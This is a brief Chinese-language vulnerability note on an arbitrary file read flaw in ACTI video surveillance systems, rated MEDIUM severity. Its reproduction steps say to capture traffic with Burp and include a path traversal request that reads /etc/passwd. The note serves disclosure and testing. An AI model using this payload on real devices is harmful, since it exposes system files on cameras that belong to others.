# ACTI 视频监控 images 任意文件读取漏洞

## 漏洞描述
ACTI 视频监控 存在任意文件读取漏洞

## 危害等级
MEDIUM

## 参考链接

## 漏洞复现方法
登录页面如下

![](images/202202140926386.png)

使用Burp抓包

```plain
/images/../../../../../../../../etc/passwd
```

